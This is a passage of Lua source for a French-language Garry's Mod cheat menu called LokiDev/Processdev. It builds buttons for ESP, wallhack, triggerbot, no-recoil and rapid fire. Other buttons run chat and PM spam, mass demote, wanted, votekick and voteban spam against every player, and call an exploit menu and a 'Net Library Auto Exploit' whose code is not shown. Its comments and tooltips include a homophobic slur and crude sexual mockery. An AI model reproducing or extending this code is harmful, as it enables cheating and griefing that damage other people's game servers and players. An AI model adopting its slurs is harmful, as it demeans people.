for k, v in pairs(plys) do
if !v:IsValid() then return end
if v:GetFriendStatus() == "friend" and ZNX.Vars.AutoAddSteamFriends and !table.HasValue( ZNX.Buddies, v ) then
ZNX.AddFriend( v )
end
end
end )
-- this is for faggots that attempt to restrict ulx who
function ZNX.Who()
local plys = player.GetAll()
for k, v in pairs(plys) do
if v:GetNWString("usergroup") then
local col = Color( 150, 150, 200, 255 )
if v:GetNWString("usergroup") != "user" then col = Color( 250, 200, 150, 255 ) end
MsgC(col, v:GetName() .. string.rep("\t", math.Round(8 / #v:GetName())), v:GetNWString("usergroup").."\n")
end
end
end
concommand.Add("LokiDev_who", ZNX.Who)
local grad = Material( "gui/gradient" )
local upgrad = Material( "gui/gradient_up" )
local downgrad = Material( "gui/gradient_down" )
local o_color1 = Color(50, 0, 0, 255 )
local o_color2 = Color(155, 155, 155, 255)
function ZNX.ToggleVar( var, fancyname )
if ZNX.Vars[var] then
if ZNX.Vars.Notifications then ZNX.ChatText( fancyname.." Désactiver", Color(255,205,205) ) end
if string.find(var, "Xray") or var == "Vision" then ZNX.XrayShutoff() end -- need to run this function to properly unfuck things that have been xray'd
ZNX.Vars[var] = false
else
if ZNX.Vars.Notifications then ZNX.ChatText( fancyname.." Activer", Color(255,255,255) ) end
ZNX.Vars[var] = true
end
ZNX.SaveSettings()
end
for k, v in pairs(ZNX.Vars) do
concommand.Add("LokiDev_togglevar_"..string.lower(k), function() ZNX.ToggleVar( k, k ) end)
end
function ZNX.ChangeColorScheme( num )
if not isnumber(num) then return end
if num <= 0 or num > #ZNX.DefaultSchemes then print("I don't know how you fucked up this badly but you are trying to change to a colour scheme that doesn't exist!") return end
local c1 = ZNX.DefaultSchemes[num][2]
local c2 = ZNX.DefaultSchemes[num][3]
if ZNX.Vars.Notifications then ZNX.ChatText( "Couleur du menu changé pour: "..ZNX.DefaultSchemes[num][1], c1 ) end
ZNX.DefaultScheme = c1
ZNX.DefaultScheme2 = c2
ZNX.ColScheme = Vector(c1.r / 255, c1.g / 255, c1.b / 255)
ZNX.ColScheme2 = Vector(c2.r / 255, c2.g / 255, c2.b / 255)
-- ZNX.NumberVars.ColorScheme = num -- done inside the button logic
end
function ZNX.MakeToggleButton( parent, x, y, btext, var, vartext, tooltip)
if !parent:IsValid() then return end
local TButton = vgui.Create( "DButton" )
TButton:SetParent( parent )  
TButton:SetPos( x, y )
TButton:SetText( btext )
TButton:SetTextColor( Color(255, 255, 255, 255) )
TButton:SetSize( 110, 25 )
if tooltip != nil then TButton:SetToolTip( tooltip ) end
TButton.Paint = function( self, w, h )
surface.SetDrawColor( ZNX.DefaultScheme )
TButton:SetText( btext )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( o_color1 )
surface.SetMaterial( downgrad )
surface.DrawTexturedRect( 0, 0, w, h/ 2 )
if ZNX.Vars[var] then
surface.SetDrawColor( Color(150, 250, 150, 255) )
else
surface.SetDrawColor( Color(100, 100, 100, 255) )
end
surface.DrawOutlinedRect( 0, 0, w, h )
end
TButton.DoClick = function()
ZNX.ToggleVar( var, vartext )
end
end
function ZNX.MakeFunctionButton( parent, x, y, btext, func, tooltip)
if !parent:IsValid() then return end
local TButton = vgui.Create( "DButton" )
TButton:SetParent( parent )  
TButton:SetPos( x, y )
TButton:SetText( btext )
TButton:SetTextColor( Color(255, 255, 255, 255) )
TButton:SetSize( 110, 25 )
if tooltip != nil then TButton:SetToolTip( tooltip ) end
TButton.Paint = function( self, w, h )
surface.SetDrawColor( ZNX.DefaultScheme )
TButton:SetText( btext )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( o_color1 )
surface.SetMaterial( downgrad )
surface.DrawTexturedRect( 0, 0, w, h/ 2 )
surface.SetDrawColor( Color(100, 100, 100, 255) )
surface.DrawOutlinedRect( 0, 0, w, h )
end
TButton.DoClick = function()
func()
end
end
function ZNX.MakeFloatingButton( x, y, btext, func)
local TButton = vgui.Create( "DButton" )
TButton:SetPos( x, y )
TButton:SetText( btext )
TButton:SetTextColor( Color(255, 255, 255, 255) )
TButton:SetSize( 110, 25 )
TButton.Paint = function( self, w, h )
surface.SetDrawColor( ZNX.DefaultScheme )
TButton:SetText( btext )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color(100, 100, 100, 255) )
surface.DrawOutlinedRect( 0, 0, w, h )
end
if !DarkRP then
hook.Add( "Think", "Screen.Clickable", function()
gui.EnableScreenClicker( input.IsKeyDown( KEY_F3 ) )
end )
end
TButton.DoClick = function()
func()
end
return TButton
end
function ZNX.MakeSlider( parent, x, y, length, text, min, max, var )
if !parent:IsValid() then return end
local sbg = vgui.Create( "DPanel" )
sbg:SetParent( parent )
sbg:SetPos( x, y )
sbg:SetSize( length, 25 )
sbg.Paint = function( self, w, h ) -- Paint function
surface.SetDrawColor( ZNX.DefaultScheme )
surface.DrawRect(0, 0, w, h )
surface.SetDrawColor( o_color1 )
surface.SetMaterial( downgrad )
surface.DrawTexturedRect( 0, 0, w, h/ 2 )
surface.SetDrawColor( 90, 50, 50, 255 )
surface.DrawOutlinedRect(0, 0, w, h )
end
local NumSlider = vgui.Create( "DNumSlider", sbg )
NumSlider:SetPos( 10,-5 )
NumSlider:SetWide( length - 10 )
NumSlider:SetText( text )
NumSlider:SetMin( min )
NumSlider:SetMax( max )
NumSlider:SetValue( ZNX.NumberVars[var] )
NumSlider:SetDecimals( 0 )
NumSlider.OnValueChanged = function( panel, val ) ZNX.NumberVars[var] = math.floor(val) end
end
function ZNX.MakeKeyBinder( parent, x, y, length, height, keyvar, changetxt )
local binder = vgui.Create( "DBinder", parent )
binder:SetSize( length, height )
binder:SetPos( x, y )
binder:SetTextColor( Color(255,255,255) )
binder:SetSelected( ZNX.NumberVars[keyvar] )
binder.Paint = function( self, w, h )
surface.SetDrawColor( ZNX.DefaultScheme )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( o_color1 )
surface.SetMaterial( downgrad )
surface.DrawTexturedRect( 0, 0, w, h/ 2 )
surface.SetDrawColor( Color(100, 100, 100, 255) )
surface.DrawOutlinedRect( 0, 0, w, h )
end
function binder:SetSelectedNumber( num )
ZNX.ChatText( "Ajouter "..changetxt.." touche", Color(255,255,255) )
self.m_iSelectedNumber = num
ZNX.NumberVars[keyvar] = num
end
end
------------------------------------------------------------------------Processdev MENU--------------------------------------------------------------------------------------
function ZNX.Menu()
if AceMenu then return false end
local AceMenu = vgui.Create("DFrame")
AceMenu:SetSize(500,700)
AceMenu:SetTitle("")
AceMenu:Center()
AceMenu:MakePopup()
AceMenu.Paint = function( panel, w, h )
surface.SetDrawColor( ZNX.DefaultScheme )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( o_color1 )
surface.SetMaterial( upgrad )
surface.DrawTexturedRect( 0, h / 2, w, h / 2 )
surface.SetDrawColor( o_color1 )
surface.SetMaterial( downgrad )
surface.DrawTexturedRect( 0, 0, w, h/ 2 )
surface.SetDrawColor( o_color2 )
surface.DrawOutlinedRect( 0, 0, w, h )
surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )
end
local PropertySheet = vgui.Create( "DPropertySheet" )
PropertySheet:SetParent( AceMenu )
PropertySheet:SetPos( 10, 30 )
PropertySheet:SetSize( 480, AceMenu:GetTall() - 40 )
PropertySheet.Paint = function()
surface.SetDrawColor( Color(0, 0, 0, 200) )
surface.DrawRect(0, 0, PropertySheet:GetWide(), PropertySheet:GetTall())
for k, v in pairs(PropertySheet.Items) do
if v.Tab then
v.Tab.Paint = function(self,w,h)
draw.RoundedBox(0, 0, 0, w, h, Color(80,80,80))
end
end
end
end
--------------------------------------------Tabs-------------------------------------------
local General = vgui.Create( "DPanel" )
General:SetPos( 0, 0 )
General:SetSize( 480, AceMenu:GetTall() - 40 )
General.Paint = function() -- Paint function
surface.SetDrawColor(50, 50, 50 ,255)
surface.DrawOutlinedRect(0, 0, General:GetWide(), General:GetTall())
surface.SetDrawColor(0, 0, 0 ,200)
surface.DrawRect(0, 0, General:GetWide(), General:GetTall())
surface.SetDrawColor( 90, 50, 50, 255 )
surface.DrawRect(0, 40, General:GetWide(), 2)
end
local Utility = vgui.Create( "DPanel" )
Utility:SetPos( 0, 0 )
Utility:SetSize( 480, AceMenu:GetTall() - 40 )
Utility.Paint = function() -- Paint function
surface.SetDrawColor(50, 50, 50 ,255)
surface.DrawOutlinedRect(0, 0, Utility:GetWide(), Utility:GetTall())
surface.SetDrawColor(0, 0, 0 ,200)
surface.DrawRect(0, 0, Utility:GetWide(), Utility:GetTall())
end
local UtilityButton = vgui.Create( "DButton" )
UtilityButton:SetParent( Utility )  
UtilityButton:SetPos( 5, 360 )
UtilityButton:SetText( "Spam DarkRP Animation: "..animatinginfo)
UtilityButton:SetTextColor( Color(255, 255, 255, 255) )
UtilityButton:SetSize( 225, 25 )
if tooltip != nil then UtilityButton:SetToolTip( tooltip ) end
UtilityButton.Paint = function( self, w, h )
surface.SetDrawColor( ZNX.DefaultScheme )
UtilityButton:SetText( "Spam DarkRP Animation: "..animatinginfo)
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( o_color1 )
surface.SetMaterial( downgrad )
surface.DrawTexturedRect( 0, 0, w, h/ 2 )
surface.SetDrawColor( Color(100, 100, 100, 255) )
surface.DrawOutlinedRect( 0, 0, w, h )
end
UtilityButton.DoClick = function ()
Animation() -- What happens when you press the button
end
local UtilityButton2 = vgui.Create( "DButton" )
UtilityButton2:SetParent( Utility )  
UtilityButton2:SetPos( 235, 360 )
UtilityButton2:SetText( "ULX Commande Spammer: "..info_ulx_spam)
UtilityButton2:SetTextColor( Color(255, 255, 255, 255) )
UtilityButton2:SetSize( 225, 25 )
if tooltip != nil then UtilityButton2:SetToolTip( tooltip ) end
UtilityButton2.Paint = function( self, w, h )
surface.SetDrawColor( ZNX.DefaultScheme )
UtilityButton2:SetText( "ULX Commande Spammer: "..info_ulx_spam)
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( o_color1 )
surface.SetMaterial( downgrad )
surface.DrawTexturedRect( 0, 0, w, h/ 2 )
surface.SetDrawColor( Color(100, 100, 100, 255) )
surface.DrawOutlinedRect( 0, 0, w, h )
end
UtilityButton2.DoClick = function ()
ULXspam() -- What happens when you press the button
end
local UtilityButton3 = vgui.Create( "DButton" )
UtilityButton3:SetParent( Utility )  
UtilityButton3:SetPos( 235, 480 )
UtilityButton3:SetText( "Props Spammer: "..spam_props_text)
UtilityButton3:SetTextColor( Color(255, 255, 255, 255) )
UtilityButton3:SetSize( 225, 25 )
if tooltip != nil then UtilityButton3:SetToolTip( tooltip ) end
UtilityButton3.Paint = function( self, w, h )
surface.SetDrawColor( ZNX.DefaultScheme )
UtilityButton3:SetText( "Props Spammer: "..spam_props_text)
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( o_color1 )
surface.SetMaterial( downgrad )
surface.DrawTexturedRect( 0, 0, w, h/ 2 )
surface.SetDrawColor( Color(100, 100, 100, 255) )
surface.DrawOutlinedRect( 0, 0, w, h )
end
UtilityButton3.DoClick = function ()
PropSpam() -- What happens when you press the button
end
local UtilityButton4 = vgui.Create( "DButton" )
UtilityButton4:SetParent( Utility )  
UtilityButton4:SetPos( 235, 540 )
UtilityButton4:SetText( "DarkRP Billet Spammer: "..billet_spam)
UtilityButton4:SetTextColor( Color(255, 255, 255, 255) )
UtilityButton4:SetSize( 225, 25 )
if tooltip != nil then UtilityButton4:SetToolTip( tooltip ) end
UtilityButton4.Paint = function( self, w, h )
surface.SetDrawColor( ZNX.DefaultScheme )
UtilityButton4:SetText( "DarkRP Billet Spammer: "..billet_spam)
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( o_color1 )
surface.SetMaterial( downgrad )
surface.DrawTexturedRect( 0, 0, w, h/ 2 )
surface.SetDrawColor( Color(100, 100, 100, 255) )
surface.DrawOutlinedRect( 0, 0, w, h )
end
UtilityButton4.DoClick = function ()
Moneyssuperspam() -- What happens when you press the button
end
local Exploit = vgui.Create( "DPanel" )
Exploit:SetPos( 0, 0 )
Exploit:SetSize( 480, AceMenu:GetTall() - 40 )
Exploit.Paint = function() -- Paint function
surface.SetDrawColor(50, 50, 50 ,255)
surface.DrawOutlinedRect(0, 0, Exploit:GetWide(), Exploit:GetTall())
surface.SetDrawColor(0, 0, 0 ,200)
surface.DrawRect(0, 0, Exploit:GetWide(), Exploit:GetTall())
end
if !Exploit:IsValid() then return end
local ExploitButton = vgui.Create( "DButton" )
ExploitButton:SetParent( Exploit )  
ExploitButton:SetPos( 5, 10 )
ExploitButton:SetText( "Processdev Exploit Menu" )
ExploitButton:SetTextColor( Color(255, 255, 255, 255) )
ExploitButton:SetSize( 454, 25 )
if tooltip != nil then ExploitButton:SetToolTip( tooltip ) end
ExploitButton.Paint = function( self, w, h )
surface.SetDrawColor( ZNX.DefaultScheme )
ExploitButton:SetText( "Processdev Exploit Menu" )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( o_color1 )
surface.SetMaterial( downgrad )
surface.DrawTexturedRect( 0, 0, w, h/ 2 )
surface.SetDrawColor( Color(100, 100, 100, 255) )
surface.DrawOutlinedRect( 0, 0, w, h )
end
ExploitButton.DoClick = function ()
if AceMenu then
AceMenu:Close()
end
RunConsoleCommand( "exploit_menu" ) -- What happens when you press the button
end
local Exploit2Button = vgui.Create( "DButton" )
Exploit2Button:SetParent( Exploit )  
Exploit2Button:SetPos( 5, 40 )
Exploit2Button:SetText( "Processdev Exploit Menu" )
Exploit2Button:SetTextColor( Color(255, 255, 255, 255) )
Exploit2Button:SetSize( 454, 25 )
if tooltip != nil then Exploit2Button:SetToolTip( tooltip ) end
Exploit2Button.Paint = function( self, w, h )
surface.SetDrawColor( ZNX.DefaultScheme )
Exploit2Button:SetText( "Net Library Auto Exploit: "..statutautoexploit )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( o_color1 )
surface.SetMaterial( downgrad )
surface.DrawTexturedRect( 0, 0, w, h/ 2 )
surface.SetDrawColor( Color(100, 100, 100, 255) )
surface.DrawOutlinedRect( 0, 0, w, h )
end
Exploit2Button.DoClick = function ()
AutoNetExploit()
end
local Botsettings = vgui.Create( "DPanel" )
Botsettings:SetPos( 0, 0 )
Botsettings:SetSize( 480, AceMenu:GetTall() - 40 )
Botsettings.Paint = function() -- Paint function
surface.SetDrawColor(50, 50, 50 ,255)
surface.DrawOutlinedRect(0, 0, Botsettings:GetWide(), Botsettings:GetTall())
surface.SetDrawColor(0, 0, 0 ,200)
surface.DrawRect(0, 0, Botsettings:GetWide(), Botsettings:GetTall())
end
local Debug = vgui.Create( "DPanel" )
Debug:SetPos( 0, 0 )
Debug:SetSize( 480, AceMenu:GetTall() - 40 )
Debug.Paint = function() -- Paint function
surface.SetDrawColor(50, 50, 50 ,255)
surface.DrawOutlinedRect(0, 0, Debug:GetWide(), Debug:GetTall())
surface.SetDrawColor(0, 0, 0 ,200)
surface.DrawRect(0, 0, Debug:GetWide(), Debug:GetTall())
if ZNX.MemoryDebug then
draw.DrawText( "Visuel Utilisation de la RAM: "..ZNX.MemoryDebug["hud"].."kb", "Default", 10, 530, Color(255,255,255) )
draw.DrawText( "Noyau logique Utilisation de la RAM: "..ZNX.MemoryDebug["logic"].."kb", "Default", 10, 545, Color(255,255,255) )
draw.DrawText( "Aimbot Utilisation de la RAM: "..ZNX.MemoryDebug["aimbot"].."kb", "Default", 10, 560, Color(255,255,255) )
surface.SetDrawColor( ZNX.DefaultScheme )
surface.DrawRect(250, 532, math.Clamp( ZNX.MemoryDebug["hud"] * 0.75, 0, 200), 10 )
surface.DrawRect(250, 547, math.Clamp( ZNX.MemoryDebug["logic"] * 20, 0, 200), 10 )
surface.DrawRect(250, 562, math.Clamp( ZNX.MemoryDebug["aimbot"] * 20, 0, 200), 10 )
surface.SetDrawColor( ZNX.DefaultScheme )
surface.DrawOutlinedRect(250, 532, 200, 10 )
surface.DrawOutlinedRect(250, 547, 200, 10 )
surface.DrawOutlinedRect(250, 562, 200, 10 )
end
end
--------------------------------------------Buttons-------------------------------------------
function ZNX.RefreshConsole()
if richtext then richtext:Remove() end
if !ValidPanel(Debug) then return end
richtext = vgui.Create( "RichText", Debug )
richtext:SetPos(5, 5)
richtext:SetSize( 440, AceMenu:GetTall() - 180 )
for idx, tab in pairs(ZNX.Debug) do
richtext:InsertColorChange( tab[2].r, tab[2].g, tab[2].b, 255 )
richtext:AppendText( tab[1].."\n" )
end
end
timer.Create("znx_refreshconsole", 1.5, 0, function() ZNX.RefreshConsole() end)
ZNX.MakeToggleButton( General, 5, 10, "Vision", "Vision", "Vision")
ZNX.MakeSlider( General, 5, 590, 455, "Distance de Vision Max (Metres)", 0, 2000, "VisionDist" )
ZNX.MakeToggleButton( General, 5, 70, "Activer ESP", "ShowESP", "Activer ESP")
ZNX.MakeToggleButton( General, 120, 70, "Afficher Joueur Mort", "ShowDead", "Afficher les joueurs morts")
ZNX.MakeToggleButton( General, 235, 70, "Afficher Amis", "ShowFriends", "Afficher Amis")
--ZNX.MakeToggleButton( General, 350, 70, "Couleur Joueur Radar", "RadarColors", "Couleur des joueurs sur le radar")
ZNX.MakeToggleButton( General, 350, 100, "Afficher Arme", "ArmeESP", "Afficher l'arme equiper")
ZNX.MakeToggleButton( General, 235, 100, "Afficher Cible(s)", "ShowTargets", "Afficher Cible(s)", "Afficher les joueurs qui figurent sur votre liste de cibles")
ZNX.MakeToggleButton( General, 120, 100, "Afficher les Admins", "ShowRanks", "Afficher les Admins")
ZNX.MakeToggleButton( General, 5, 100, "Afficher la Distance", "ShowDistance", "Afficher la Distance des joueurs")
ZNX.MakeToggleButton( General, 5, 130, "Afficher les Props", "ESPProps", "Afficher les Props")
ZNX.MakeToggleButton( General, 120, 130, "Afficher Entité Menu", "Entfinder", "Afficher Entité Menu")
ZNX.MakeToggleButton( General, 235, 130, "Couleur du Métier", "TeamColors", "Afficher la Couleur du Métier")
ZNX.MakeToggleButton( General, 235, 160, "Afficher les NPC", "NPC_ESP", "Afficher les NPC")
ZNX.MakeToggleButton( General, 350, 130, "Afficher Vie", "ShowHP", "Afficher Vie")
ZNX.MakeToggleButton( General, 5, 490, "Lignes de Vision", "Vizlines", "Lignes de Vision")
ZNX.MakeToggleButton( General, 120, 490, "Ajouter Amis Steam", "AutoAddSteamFriends", "Ajouter automatiquement les amis steam a l'esp")
ZNX.MakeToggleButton( General, 5, 160, "Afficher la Position", "VSquares", "Afficher la position des joueurs")
ZNX.MakeToggleButton( General, 120, 160, "Afficher Noms", "VNames", "Afficher noms des joueurs")
ZNX.MakeToggleButton( General, 350, 160, "Afficher Argent", "ArgentESP", "Afficher l'argent des joueur a l'esp")
ZNX.MakeToggleButton( General, 5, 190, "Miroir Vision Arrière", "Mirror", "Affiche un miroir vision arrière")
ZNX.MakeSlider( General, 5, 225, 225, "Miroir X", 0, ScrW(), "MirrorX" )
ZNX.MakeSlider( General, 235, 225, 220, "Miroir Y", 0, ScrH(), "MirrorY" )
ZNX.MakeSlider( General, 235, 190, 220, "Taille Miroir", 0, 60, "MirrorSize" )
ZNX.MakeFunctionButton( General, 120, 190, "Axe Vertical Miroir", function()
if ZNX.NumberVars.MirrorAxis == 0 then
if ZNX.Vars.Notifications then ZNX.ChatText( "Réglez le mode d'axe du miroir sur imiter", Color(255,255,255) ) end
ZNX.NumberVars.MirrorAxis = 1
elseif ZNX.NumberVars.MirrorAxis == 1 then
if ZNX.Vars.Notifications then ZNX.ChatText( "Réglez le mode d'axe du miroir sur inverser", Color(255,255,255) ) end
ZNX.NumberVars.MirrorAxis = 2
else
if ZNX.Vars.Notifications then ZNX.ChatText( "Réglez le mode d'axe du miroir sur rien", Color(255,255,255) ) end
ZNX.NumberVars.MirrorAxis = 0
end
end)
ZNX.MakeFunctionButton( General, 5, 260, "Basculer CameraLibre", function() 
ZNX.Freecam = !ZNX.Freecam
ZNX.ChatText( "Réglez le mode CameraLibre sur: "..tostring(ZNX.Freecam), Color(255,255,255) )
end, "Détecte le miroir et le transforme en un système de cameralibre")
ZNX.MakeFunctionButton( General, 120, 260, "Ramener CameraLibre", function() 
ZNX.FreecamCoordinates.pos = LocalPlayer():EyePos() 
ZNX.FreecamCoordinates.ang = LocalPlayer():EyeAngles()
ZNX.ChatText( "Ramener CameraLibre", Color(255,255,255) )
end, "Ramener la cameralibre a votre position de vue")
ZNX.MakeToggleButton( General, 120, 290, "CameraLibre Mobile", "FreecamControls", "CameraLibre Mobile")
ZNX.MakeKeyBinder(General, 400, 260, 50, 20, "FreecamForward", "CameraLibre Avancer" )
ZNX.MakeKeyBinder(General, 400, 290, 50, 20, "FreecamBack", "CameraLibre Reculer" )
ZNX.MakeKeyBinder(General, 235, 275, 50, 20, "FreecamLeft", "CameraLibre Gauche" )
ZNX.MakeKeyBinder(General, 345, 275, 50, 20, "FreecamRight", "CameraLibre Droite" )
ZNX.MakeKeyBinder(General, 290, 260, 50, 20, "FreecamUp", "CameraLibre Monter" )
ZNX.MakeKeyBinder(General, 290, 290, 50, 20, "FreecamDown", "CameraLibre Descendre" )
ZNX.MakeToggleButton( General, 5, 320, "Radar Joueur", "Radar", "Radar afficher joueurs")
ZNX.MakeSlider( General, 120, 320, 165, "Taille Radar", 50, 600, "RadarSize" )
ZNX.MakeSlider( General, 290, 320, 165, "Radar Zoom", 10, 150, "RadarZoom" )
ZNX.MakeSlider( General, 5, 350, 145, "Radar X", 0, ScrW(), "RadarX" )
ZNX.MakeSlider( General, 155, 350, 145, "Radar Y", 0, ScrH(), "RadarY" )
ZNX.MakeSlider( General, 305, 350, 150, "Radar Alpha", 0, 255, "RadarAlpha" )
ZNX.MakeToggleButton( General, 5, 390, "Activer Rayon X", "Xray", "Activer le Rayon X")
ZNX.MakeToggleButton( General, 120, 390, "Rayon X Joueurs", "XrayPlayers", "Afficher les joueurs sur le X-Ray")
ZNX.MakeToggleButton( General, 235, 390, "Rayon X Props", "XrayProps", "Afficher les props sur le X-Ray")
ZNX.MakeToggleButton( General, 350, 390, "Rayon X Entité Menu", "XrayEntfinder", "Afficher l'Entité Menu sur le X-Ray")
ZNX.MakeToggleButton( General, 5, 420, "Rayon X Couleur Solide", "XraySolid", "Rayon X Couleur Solide")
ZNX.MakeSlider( General, 5, 450, 455, "Distance de Rayon X Max (Metres)", 0, 2000, "XrayDistance" )
ZNX.MakeToggleButton( General, 120, 420, "Rayon X Couleur", "NoChamColours", "Rayon X Couleur")
ZNX.MakeToggleButton( General, 235, 420, "Rayon X Couleur Vive", "PKChams", "Rayon X Couleur Vive")
ZNX.MakeToggleButton( Utility, 5, 480, "Témoins Détecteur", "WitnessDetector", "Témoins Détecteur")
ZNX.MakeToggleButton( Utility, 120, 480, "Spectateur Détecteur", "SpectatorDetector", "Spectateur Détecteur")
ZNX.MakeToggleButton( General, 120, 550, "Crosshair", "Crosshair", "Crosshair")
ZNX.MakeToggleButton( General, 350, 70, "Afficher 3D BBox", "BoundingBox3d", "Afficher 3D BBox")
ZNX.MakeToggleButton( General, 235, 490, "HEURE/FPS/PING", "ShowFPS", "Afficher les FPS/PING/HEURE")
ZNX.MakeFunctionButton( General, 235, 550, "Mur Transparent", function() ZNX.ToggleWraithVision() end)
ZNX.MakeToggleButton( General, 120, 520, "PK Joueur Faisceau", "PKPlayerBeams", "Propkill Joueur Faisceau")
ZNX.MakeToggleButton( General, 235, 520, "PK Prop Faisceau", "PKPropBeams", "Propkill Prop Faisceau")
ZNX.MakeToggleButton( General, 350, 520, "PK Faisceau Verticale", "PKVerticalBeams", "PK Faisceau Verticale")
ZNX.MakeToggleButton( General, 5, 550, "PK Velocité", "PKVelocity", "Propkill Velocité")
ZNX.MakeToggleButton( General, 350, 550, "ClientSide Lampe", "CSFlashlight", "ClientSide Lampe")
ZNX.MakeFunctionButton( Utility, 120, 540, "Vitesse Physics Gun", function() physicgunspeed() end)
ZNX.MakeFunctionButton( General, 350, 10, "Menu des Joueurs", function() ZNX.PlayerMenu() end)
ZNX.MakeFunctionButton( General, 120, 10, "Couleur du Menu", function()
if ZNX.NumberVars.ColorScheme < #ZNX.DefaultSchemes then
ZNX.NumberVars.ColorScheme = ZNX.NumberVars.ColorScheme + 1
else
ZNX.NumberVars.ColorScheme = 1
end
ZNX.ChangeColorScheme( ZNX.NumberVars.ColorScheme )
end)
ZNX.MakeFunctionButton( General, 235, 10, "Entité Menu", ZNX.EntMarkerMenu )
ZNX.MakeToggleButton( Utility, 235, 10, "Rapid Fire", "Autoclick", "Rapid Fire", "Faites tirez le bouton de tire votre souris a la vitesse maximale possible en les maintenant enfoncés")
ZNX.MakeToggleButton( Utility, 120, 10, "Bunny Hop", "Bhop", "Bunny Hop")
ZNX.MakeToggleButton( Utility, 350, 10, "Spam de corde", "RopeStorm", "Spam de corde", "Clic droit avec le tool corde pour spammer une masse de cordes")
ZNX.MakeToggleButton( Utility, 5, 40, "3ème Personne", "Thirdperson", "3ème Personne")
--ZNX.MakeToggleButton( Utility, 5, 120, "Camera Spam", "CameraSpam", "Camera Spam")
ZNX.MakeToggleButton( Utility, 120, 150, "Anti Recul", "NoRecoil", "Anti Recul", "Enleve le recul des armes")
ZNX.MakeToggleButton( Utility, 235, 150, "Lampe Spam", "FlashlightSpam", "Lampe Spam", "Appuyez sur F pour spam la lampe")
ZNX.MakeSlider( Utility, 120, 40, 160, "3Pers Dist...", 0, 1000, "TPSDistance" )
ZNX.MakeSlider( Utility, 285, 40, 175, "3Pers Offs...", -100, 100, "TPSOffset" )
ZNX.MakeSlider( Utility, 235, 450, 225, "Taille de l'Alarme", 1, 100, "AreaScrollerSize" )
ZNX.MakeFunctionButton( Utility, 5, 150, "Inspectez votre arme", ZNX.GunMenu, "Afficher une page d'informations sur l'arme dans vos mains" )
ZNX.MakeFunctionButton( Utility, 120, 180, "Scanneur d'entité", ZNX.ToggleEntityScanner, "Obtenez des informations détaillées et effectuez facilement des actions sur les entités sous votre curseur (utilisez F3 pour cliquer sur les boutons !!)" )
ZNX.MakeToggleButton( Utility, 350, 150, "Notifier les Kills", "NotifyKills", "Notifier les Kills", "Affiche les Kills dans le Chat")
--ZNX.Vars.NotifyKills
ZNX.MakeToggleButton( Utility, 5, 210, "Spammer le Chat", "ChatSpam", "Spammer le Chat", "Spam le chat")
ZNX.MakeToggleButton( Utility, 120, 210, "Spammer en OOC", "ChatSpamOOC", "Spammer en OOC", "Automatiquement mettre votre chat spam en mode OOC dans darkrp et la plupart des autres gamemodes rp")
ZNX.MakeToggleButton( Utility, 235, 210, "Bind pour Spammer", "ChatSpamBind", "Bind pour Spammer", "Chatspam seulement lorsque vous appuyez sur alt gauche")
--ZNX.MakeToggleButton( Utility, 350, 210, "Random Insults", "ChatSpamInsult", "Chatspam Random Insults", "Shower randomly generated abuse on everybody")
ZNX.MakeToggleButton( Utility, 350, 180, "/PM Mode", "ChatSpamPM", "/PM Spam Mode", "Spams /pm messages a tout le monde sur le serveur")
ZNX.MakeToggleButton( Utility, 350, 210, "/PM Admins", "ChatSpamPMAdmins", "/PM Spam Admins", "Devrions-nous /pm spam les admins ?")
ZNX.MakeFunctionButton( Utility, 235, 180, "Chatspam Commande", function() 
ZNX.ChatText( "Commande Chatspam afficher dans votre console", Color(255,255,255) )
print( "---- CHAT SPAMMER COMMANDE ----" )
print( "@1 = Insulte aléatoire" )
print( "@PrenezLokidev = Message de promotion pour le menu ^^" )
print( "METTEZ-LES DANS LE CHAMP DE TEXTE CHATSPAMMER ET ILS SERONT FORMATÉS AUTOMATIQUEMENT EN TEXTE GÉNÉRALEMENT ALÉATOIRE")
end, "HALP HOW I USE DIS" )
ZNX.MakeFunctionButton( Utility, 5, 300, "Nouvelle Identité", ZNX.InnocentRoleplayer, "Vous avez vu faire quelque chose de sournois, maintenant il est temps d'obtenir une nouvelle identité\nSuicide et randomise votre nom, votre emploi et vos couleurs" )
ZNX.MakeFunctionButton( Utility, 235, 90, "NomRP Aleatoire ♂", ZNX.GenerateRPName, "Comme vous avez la flemme de crée un bon rpname, cette fonction en produira un aléatoire pour vous" )
ZNX.MakeFunctionButton( Utility, 350, 90, "NomRP Aleatoire ♀", ZNX.GenerateRPNameFemale, "Tu veux devenir une fille pour que tu puisses prendre des bites dans ton cul ? x)" )
ZNX.MakeToggleButton( Utility, 5, 330, "RP Demote Spam", "DemoteSpam", "RP Demote Spam", "Spam demote tout le monde sur le serveur")
ZNX.MakeToggleButton( Utility, 120, 300, "RP Wanted Spam", "WantedSpam", "RP Wanted Spam", "Rendez tout le monde recherché par la police")
ZNX.MakeToggleButton( Utility, 235, 300, "ULX Vkick Spam", "ULXVotekickSpam", "ULX Vkick Spam", "Votekick tout le monde sur le serveur :^)")
ZNX.MakeToggleButton( Utility, 350, 300, "ULX Vban Spam", "ULXVotebanSpam", "ULX Vban Spam", "Voteban tout le monde sur le serveur :^)")
ZNX.MakeFunctionButton( Utility, 5, 10, "Commande Info Menu", function() ShowLokidevInfo () end, "Commande Info Menu")
ZNX.MakeToggleButton( Utility, 120, 330, "Kill Provocation", "KillTaunts", "Kill Provocation", "Chat provocation automatique quand vous tuez quelqu'un")
ZNX.MakeToggleButton( Utility, 5, 180, "Tire Ennemi Viseur", "Triggerbot", "Tire Ennemi Viseur", "Tirez automatiquement lorsque vous regardez quelqu'un")
ZNX.MakeToggleButton( Utility, 235, 330, "Mort Provocation", "DeathTaunts", "Mort Provocation", "Chat provocation automatique quand vous mourrez")
ZNX.MakeFunctionButton( Utility, 5, 450, "Ajouter une Alarme", function() RunConsoleCommand("LokiDev_base_set") end, "Définir une base pour vous avertir si les gens s'en approchent" )
